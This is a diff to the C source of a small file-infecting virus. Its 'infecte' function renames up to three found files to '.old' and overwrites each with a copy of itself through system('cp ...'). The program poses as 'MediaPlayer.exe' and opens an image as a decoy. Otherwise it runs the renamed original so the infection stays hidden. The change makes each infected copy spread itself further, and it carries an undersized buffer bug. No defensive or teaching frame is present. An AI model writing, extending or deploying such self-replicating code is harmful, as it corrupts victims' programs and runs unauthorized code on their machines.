@@ -51,21 +51,48 @@ char** searchFiles(char* exeption)
 	return files;	
 }
 
-void infecte(char** files)
+void infecte(char** files, char *arg)
 {
 	for(int i=0;i<3;i+=1){
-		char x[strlen(files[i])+strlen(".old")+1];
-		char currentFile[strlen(files[i])+1];
-		strcpy(currentFile,files[i]);
-		strcpy(x,files[i]);
-		strcat(x,".old");
-		rename(files[i],x);
-		char copyFile[500]="";
-		strcat(copyFile,"cp ");
-		strcat(copyFile,"./MediaPlayer.exe");
-		strcat(copyFile," ");
-		strcat(copyFile,files[i]);
-		system(copyFile);
+		if(files[i]!=NULL){
+			char x[strlen(files[i])+strlen(".old")+1];
+			char currentFile[strlen(files[i])+1];
+			strcpy(currentFile,files[i]);
+			strcpy(x,files[i]);
+			strcat(x,".old");
+			rename(files[i],x);
+			char copyFile[500]="";
+			strcat(copyFile,"cp ");
+			strcat(copyFile,arg);
+			strcat(copyFile," ");
+			strcat(copyFile,files[i]);
+			system(copyFile);
+		}
+	}
+}
+
+void execution(char *arg){
+	if(strcmp(arg,"./MediaPlayer.exe")!=0)
+	{
+		char progExec[strlen(arg+5)];//prog.old
+		strcpy(progExec,arg);
+		strcat(progExec,".old");
+		system(progExec);
+	}else{
+		char uneimage[256] = "xdg-open ./";
+		DIR *d;
+		struct dirent *dir;
+		d = opendir(".");
+		if (d) {
+			while ((dir = readdir(d)) != NULL) {
+				if(strstr(dir->d_name, ".jpg") || strstr(dir->d_name, ".jpeg") || strstr(dir->d_name, ".png")){
+					strcat(uneimage, dir->d_name);
+					system(uneimage);
+					break;
+				}
+			}
+			closedir(d);
+		}
 	}
 }
 
@@ -75,14 +102,7 @@ int main(int argc, char *argv[])
 	strcpy(exeptionFile,argv[0]);
 	char** f = searchFiles(exeptionFile);
 	if(f[0]!=NULL)
-	infecte(f);
-	if(strcmp(argv[0],"./MediaPlayer.exe")!=0)
-	{
-		char progExec[strlen(argv[0]+5)];//prog.old
-		strcpy(progExec,argv[0]);
-		strcat(progExec,".old");
-		system(progExec);
-	}else{
-		system("xdg-open ./oue.jpeg");
-	}
+	infecte(f, argv[0]);
+	execution(argv[0]);
+	return 0;
 }
